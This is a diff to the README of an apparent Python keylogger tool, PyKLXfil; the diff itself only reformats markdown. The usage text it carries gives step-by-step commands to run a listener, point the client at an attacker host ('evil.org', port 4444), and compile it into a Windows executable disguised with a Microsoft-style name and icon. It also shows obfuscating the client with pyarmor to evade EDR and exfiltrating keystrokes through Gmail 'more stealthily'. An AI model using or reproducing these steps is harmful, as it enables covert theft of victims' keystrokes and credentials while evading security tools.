@@ -12,12 +12,12 @@
   pip3 install -r requirements.txt
   ```
 ## Usage:
-* Key logging and exfiltration using socket server and client:
+### Key logging and exfiltration using socket server and client:
 ```sh
 #start listening on all NICs and on port 443 as background job
 python3 PyKLXfil-Server.py 0.0.0.0 443 &
 ```
-** Compile and obfuscate the python client for a windows machine:
+* Compile and obfuscate the python client for a windows machine:
 ```sh
 #Edit PyKLXfil-Client.py and add your server's IP/domain and port
  nano PyKLXfil-Client.py
@@ -25,19 +25,19 @@ python3 PyKLXfil-Server.py 0.0.0.0 443 &
  #self.host = 'evil.org'
  #self.port = 4444
  ```
- ** Optionally you can obfuscate the script with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
+ * Optionally you can obfuscate the script with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
  ```sh
  pip3 install pyarmor
  pip3 install pyinstaller
  pyarmor pack --clean -e "--onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32" PyKLXfil-Client.py -n mscc.exe
  ```
- ** Compile the script to exe using pyinstaller:
+ * Compile the script to exe using pyinstaller:
 ```sh
 pyinstaller --onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 -n mscc.exe PyKLXfil-Client.py
 ```
-* Key logging and exfiltration using gmail (more stealthy):
-** Compile and obfuscate the python gmail client for a windows machine (stand alone):
-*** Note: you will first need to get app password token to be used in the script, a good guide can be found [here](https://towardsdatascience.com/automate-sending-emails-with-gmail-in-python-449cc0c3c317)
+### Key logging and exfiltration using gmail (more stealthy):
+* Compile and obfuscate the python gmail client for a windows machine (stand alone):
+* Note: you will first need to get app password token to be used in the script, a good guide can be found [here](https://towardsdatascience.com/automate-sending-emails-with-gmail-in-python-449cc0c3c317)
 ```sh
 nano PyKLXfil-Client-mail.py
  #snip...       
@@ -45,7 +45,7 @@ nano PyKLXfil-Client-mail.py
   #app_password = 'qweertyuiop12345678'
   #to = 'example@gmail.com'
 ```
-** Optionally you can obfuscate the script with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
+* Optionally you can obfuscate the script with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
  ```sh
  pip3 install pyarmor
  pip3 install pyinstaller
